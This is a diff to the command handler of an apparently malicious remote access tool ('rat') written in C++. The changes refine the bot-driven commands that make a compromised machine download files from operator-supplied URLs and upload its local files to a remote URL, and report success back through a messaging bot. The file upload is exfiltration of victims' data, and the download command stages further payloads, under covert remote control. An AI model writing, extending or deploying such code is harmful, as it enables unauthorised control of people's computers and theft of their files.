@@ -1,6 +1,7 @@
 #include "rat/Handler.hpp"
 #include "rat/system.hpp"
 #include <chrono>
+#include <curl/curl.h>
 #include <mutex>
 #include <sstream>
 #include <filesystem>
@@ -23,8 +24,10 @@ void Handler::handleDownloadCommand() {
         std::lock_guard<std::mutex> backing_bot_lock(this->backing_bot_mutex);
         switch (number_params) {
             case 1: {
-                if(this->curl_client->download(url)) {
-
+                if(this->curl_client->download(url).curl_code == CURLE_OK) {
+                    this->bot->sendMessage("File was downloaded");
+                }else {
+                    this->bot->sendMessage("Download Failed");
                 }
                 break;
             }
@@ -33,13 +36,18 @@ void Handler::handleDownloadCommand() {
 
                 if (std::filesystem::exists(path) && std::filesystem::is_directory(path)) {
                     const auto file_path = path / rat::networking::_getFilePathFromUrl(url);
-                    this->curl_client->download(url, file_path);
+                    
+                    if(this->curl_client->download(url, file_path).curl_code == CURLE_OK) {
+                        this->bot->sendMessage(fmt::format("File was downloaded to path {}", file_path.string()));
+                    }else {
+                        this->bot->sendMessage("Download failed");
+                    }
                 } else {
                     if (std::filesystem::exists(path)) {
                         this->backing_bot->sendMessage(fmt::format("Warning: overwriting the file {}", path.string()));
                     }
                     
-                    if (this->curl_client->download(url, path)) {
+                    if (this->curl_client->download(url, path).curl_code == CURLE_OK) {
                         this->backing_bot->sendMessage(fmt::format("The file was downloaded: {}", path.string())); 
                     }else {
                         this->backing_bot->sendMessage(fmt::format("This file failed to download {}", path.string() ) );
@@ -82,7 +90,7 @@ void Handler::handleUploadCommand() {
             
             
             for (const auto& file_path : real_paths) {
-                if(this->curl_client->upload(file_path, url) ) {
+                if(this->curl_client->upload(file_path, url).curl_code == CURLE_OK ) {
                     this->backing_bot->sendMessage(fmt::format("File {} downloaded ", file_path.string())); 
                 }else {
                     this->backing_bot->sendMessage(fmt::format("File {} failed to download", file_path.string()));
@@ -107,7 +115,7 @@ void Handler::handleUploadCommand() {
                 std::unique_lock<std::mutex> curl_client_lock(this->curl_client_mutex);
                 std::unique_lock<std::mutex> backing_bot_lock(this->backing_bot_mutex);
                 
-                if(this->curl_client->upload(file_path, url)) {
+                if(this->curl_client->upload(file_path, url).curl_code == CURLE_OK) {
                     this->backing_bot->sendMessage(fmt::format("File {} uploaded to {}", file_path.string(), url));
                 }else {
                     this->backing_bot->sendMessage((fmt::format("File {} failed to upload to {}", file_path.string(), url)));
